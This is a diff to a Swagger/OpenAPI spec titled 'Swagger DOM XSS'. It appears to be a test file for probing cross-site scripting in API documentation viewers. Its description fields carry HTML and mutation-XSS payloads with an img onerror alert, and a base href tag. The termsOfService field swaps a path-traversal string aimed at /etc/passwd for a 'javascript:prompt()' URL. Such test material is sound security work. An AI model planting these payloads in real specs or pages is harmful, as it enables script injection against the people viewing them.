@@ -1,10 +1,10 @@
 swagger: '2.0'
 info: 
   title: Swagger DOM XSS
-  description: <mglyph></div>gg|
+  description: <img src=x><h1>gg|
     <mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('textarea') src=1>"></form>
 
-  termsOfService: "../../../../../../../etc/passwd"
+  termsOfService: "javascript:prompt()"
   version: production
 basePath: /JSSResource/
 produces:
@@ -21,7 +21,7 @@ paths:
       responses:
         '200':
           type: string   
-          description: <h1>prints xss</h1><img src=x><base href=x></div></div>
+          description: <h1>prints xss</h1><img src=x></div></div><h2>testxss
       tags:
         - accounts
       operationId: findAccounts
